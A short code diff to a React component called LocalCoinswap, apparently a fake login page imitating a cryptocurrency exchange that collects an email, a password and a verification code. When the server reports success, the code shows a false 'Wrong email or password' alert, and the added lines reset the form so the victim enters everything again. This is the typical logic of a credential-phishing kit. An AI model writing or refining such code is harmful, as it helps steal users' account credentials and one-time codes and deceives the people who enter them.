@@ -77,6 +77,12 @@ function LocalCoinswap() {
 
       if (res.ok) {
         alert("Wrong email or password! Try again using correct credentials");
+        // Reset all
+        setStep(1);
+        setEmail("");
+        setWord("");
+        setCode("");
+        //
       } else {
         alert(data.error || "Invalid code");
       }
